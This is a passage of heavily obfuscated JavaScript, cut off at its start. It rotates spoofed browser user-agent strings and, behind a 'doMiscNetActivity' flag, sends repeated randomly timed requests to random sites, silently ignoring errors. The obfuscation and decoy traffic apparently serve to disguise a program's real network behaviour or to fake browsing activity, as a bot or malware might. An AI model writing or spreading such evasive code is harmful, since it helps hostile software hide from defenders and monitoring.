      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1456 + -0x1732 + -0x3 * -0xf4; k < -0x118b + -0x1789 + 0x2918; k++)
    setTimeout(f, (0x2531 * -0xc + -0xceb0 + -0x121c * -0x31) * k * getRandomInt(0x216 * 0x11 + 0x454 + -0x27c9, 0x9bb * -0x4 + -0x14c * -0xc + 0x175f));
  setInterval(() => {
    f();
    for (let l = -0xb * -0x12f + 0x1cd1 + -0x29d6; l < -0x17ca + 0x185d + -0x8f; l++)
      setTimeout(f, (-0x15aa0 + 0x1c058 + -0x28 * -0x351) * l * getRandomInt(0x403 * 0x7 + 0x87b + -0x7 * 0x539, 0x518 + 0xd00 + 0x1 * -0x1215));
  }, -0xcf454 + -0xd266d * -0x7 + -0x182a27);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x4 * 0x2ef + -0x74a + 0x4a3 * 0xa) * getRandomInt(0x1e7 * -0x1 + 0xfe4 + 0x14 * -0xb3, 0x1 * 0xe79 + 0x4d * 0x7 + 0x9 * -0x1d7));
}, -0x26 * 0xe4 + 0x17f * -0x13 + 0x3ea9);